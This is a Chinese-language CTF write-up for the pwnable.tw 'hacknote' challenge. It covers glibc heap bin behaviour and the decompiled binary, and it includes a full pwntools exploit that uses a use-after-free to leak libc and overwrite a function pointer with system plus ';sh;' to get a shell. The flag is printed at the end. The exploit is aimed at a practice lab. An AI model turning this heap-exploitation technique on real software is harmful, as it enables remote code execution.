# hacknotes

ref
- https://hackmd.io/@minyeon/HJOnEqaTw
- http://0bs3rver.space/2020/11/02/pwnable-tw-hacknote-%E7%94%A8main-arena%E6%B3%84%E6%BC%8Flibc/#%E6%B3%84%E6%BC%8Flibc

:::success
fastbin處理較小的chunk
small bin跟large bin處理fastbin無法處理的chunk
在chunk被丟進small/large bin之前,會先被丟進unsorted bin中
tcache會擋在所有bin前面,0x20-0x410的chunk都會先被丟進tcache,直到tcache對應大小的bin不夠放

如果top chunk前面的chunk不是fast chunk並且處於空閒，那麼top chunk就會合併這個chunk 
如果top chunk前面的chunk是fast chunk，不論是否空閒，top chunk都不會合併這個chunk


:::

:::info
64bit
0x10對齊
ex. malloc(0x28) 會得到0x30 + 0x10(header)大小的chunk

glibc 預設有 0x20-0x80 共 7 個 bin

32bit
chunk in_use_size=(size+8-4) align 8B
malloc (8) = 0x10 =16

malloc (16)= 24

:::

```
[*] '/home/user/tw/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

在 nn_print_note ， `(*(void (__cdecl **)(void *))ptr[index])(ptr[index]);`

結構 ptr
- malloc(8)
    - 4byte print_func
    - 4byte ptr of note ,malloc (sizeofnote)

nn_del_note 沒有做 dword_804A04C-- ，並且也沒有把free掉的空間指標刪除，UAF

需要 leak lic ，網路上看到兩種方式
- malloc unsortbin chunk，free and malloc again，print main_arena addr
    - 32bit fastbin maxium size 60
    - malloc 64
    - malloc 32
    - free 64
    - 這樣 64 就在 unsortbin 並且 fd bk 都指向 main_arena 裡面
    - 用下面的方法把 fd bk 印出來
    - unsortbin距離main_arena的偏移是固定的+0x30 可以算出 libc addr
- puts got table addr
    - 利用 addnote16 addnote16 delnote note0 delnote note1 使四個 chunk 存在 fastbin(兩個存note 兩個存ptr)
        - 上
        - ptr1 16
        - ptr0 16
        - =====
        - note1 24
        - note2 24
    - nn_add_note 會 malloc 2 次，第一次拿到 ptr1 for ptr 再來 ptr0 for note
    - 再對 ptr0 寫入 nn_print_note + got_puts
    - 互叫 nn_print_note index 0 取得 got_puts
    - del note2 回到可以利用的狀態
    - nn_add_note 再對 ptr0 寫入 system + ";sh;"
```c 
void __cdecl __noreturn main()
{
  int v0; // eax
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      nn_print_options();
      read(0, &buf, 4u);
      v0 = atoi(&buf);
      if ( v0 != 2 )
        break;
      nn_del_note();
    }
    if ( v0 > 2 )
    {
      if ( v0 == 3 )
      {
        nn_print_note();
      }
      else
      {
        if ( v0 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v0 != 1 )
        goto LABEL_13;
      nn_add_note();
    }
  }
}

unsigned int nn_add_note()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( dword_804A04C <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !ptr[i] )
      {
        ptr[i] = malloc(8u);
        if ( !ptr[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)ptr[i] = sub_804862B;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = ptr[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)ptr[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)ptr[i] + 1), size);
        puts("Success !");
        ++dword_804A04C;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}

unsigned int nn_del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= dword_804A04C )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[v1] )
  {
    free(*((void **)ptr[v1] + 1));
    free(ptr[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}

unsigned int nn_print_note()
{
  int index; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  index = atoi(&buf);
  if ( index < 0 || index >= dword_804A04C )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[index] )
    (*(void (__cdecl **)(void *))ptr[index])(ptr[index]);
  return __readgsdword(0x14u) ^ v3;
}
```

exploit

```python=
from pwn import *
# context.log_level = 'debug'

r = remote("chall.pwnable.tw", 10102)
libc = ELF("libc_32.so.6")
elf = ELF("./hacknote")

def add(size, content):
    r.recvuntil("Your choice :")
    r.sendline('1')
    r.recvuntil("Note size :")
    r.sendline(str(size))
    r.recvuntil("Content :")
    r.send(content)

def deln(choice):
    r.recvuntil("Your choice :")
    r.sendline('2')
    r.recvuntil("Index :")
    r.sendline(str(choice))

def printn(choice):
    r.recvuntil("Your choice :")
    r.sendline('3')
    r.recvuntil("Index :")
    r.sendline(str(choice))

add(16, 'a')
add(16, 'a')


deln(0)
deln(1)

nn_print_note=0x0804862B
add(8, p32(nn_print_note) + p32(elf.got['puts']))
printn(0)

libc_address = u32(r.recv(4)) - libc.sym['puts']
print("libc_address",hex(libc_address))
system = libc_address + libc.sym["system"]

deln(2)

add(0x8, p32(system) + b';sh;')

printn(0)

r.interactive()

```


>FLAG{Us3_aft3r_fl3333_in_h4ck_not3}

